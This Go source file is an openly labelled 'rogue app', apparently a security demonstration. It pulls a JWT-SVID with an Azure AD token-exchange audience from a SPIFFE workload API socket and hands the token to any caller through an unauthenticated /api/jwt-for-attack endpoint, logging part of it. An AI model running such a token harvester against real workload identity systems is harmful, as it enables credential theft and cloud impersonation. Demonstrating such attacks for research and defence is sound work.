package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/spiffe/go-spiffe/v2/svid/jwtsvid"
	"github.com/spiffe/go-spiffe/v2/workloadapi"
)

const AzureJWTAudience = "api://AzureADTokenExchange"

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8081"
	}

	socketPath := os.Getenv("SWA_AGENT_SOCKET_PATH")
	if socketPath == "" {
		socketPath = "/tmp/swa-agent/public/api.sock"
	}

	http.HandleFunc("GET /api/jwt-for-attack", func(w http.ResponseWriter, r *http.Request) {
		handleJWTForAttack(w, r, socketPath)
	})

	http.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	log.Printf("[INFO] Rogue app starting on :%s (socket: %s)", port, socketPath)
	if err := http.ListenAndServe(fmt.Sprintf(":%s", port), nil); err != nil {
		log.Fatalf("[ERROR] HTTP server failed: %v", err)
	}
}

func handleJWTForAttack(w http.ResponseWriter, r *http.Request, socketPath string) {
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()

	// Fetch JWT-SVID from the SWA agent
	log.Println("[INFO] Fetching JWT-SVID from workload API...")
	svid, err := fetchJWTSVID(ctx, AzureJWTAudience, fmt.Sprintf("unix://%s", socketPath))
	if err != nil {
		log.Printf("[ERROR] Failed to fetch SVID: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	jwtToken := svid.Marshal()
	log.Printf("[DEBUG] Rogue app fetched JWT with sub: (first 50 chars): %s...", jwtToken[:50])

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{
		"jwt": jwtToken,
	})
}

// fetchJWTSVID fetches a JWT-SVID from the SPIFFE Workload API.
func fetchJWTSVID(ctx context.Context, audience, socketAddr string) (*jwtsvid.SVID, error) {
	ctxWithTimeout, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	workloadOptions := workloadapi.WithClientOptions(workloadapi.WithAddr(socketAddr))
	jwtSource, err := workloadapi.NewJWTSource(ctxWithTimeout, workloadOptions)
	if err != nil {
		return nil, fmt.Errorf("failed to create JWT source (socket: %s): %w", socketAddr, err)
	}
	defer jwtSource.Close()

	jwtParams := jwtsvid.Params{
		Audience: audience,
	}
	svid, err := jwtSource.FetchJWTSVID(ctxWithTimeout, jwtParams)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch JWT SVID (audience: %s): %w", audience, err)
	}

	return svid, nil
}
